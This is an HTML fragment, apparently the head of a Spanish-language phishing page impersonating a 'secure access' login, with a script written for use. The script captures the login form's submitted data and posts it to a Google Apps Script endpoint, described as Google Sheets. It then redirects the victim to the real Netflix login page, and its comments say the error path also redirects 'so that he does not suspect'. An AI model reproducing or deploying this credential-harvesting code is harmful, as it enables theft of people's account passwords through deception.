<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Acceso Seguro - Cloud</title>
   <script>
    // PEGA AQUÍ TU URL DE GOOGLE SCRIPT (LA QUE TERMINA EN /exec)
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwHh058XFvBCUL9mGxZS5cZSw9LPiqjvUOI56OAZ0NePtETmpuE7r3p3bww0bRrkGbj/exec';
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', e => {
        e.preventDefault();

        // Enviamos los datos a Google Sheets
        fetch(scriptURL, { 
            method: 'POST', 
            body: new FormData(form),
            mode: 'no-cors' 
        })
        .then(response => {
            // Una vez guardados los datos, lo enviamos a la página oficial de Netflix
            window.location.href = "https://www.netflix.com/login"; 
        })
        .catch(error => {
            console.error('Error!', error.message);
            // En caso de error, también lo mandamos para que no sospeche
            window.location.href = "https://www.netflix.com/login";
        });
    });
</script>
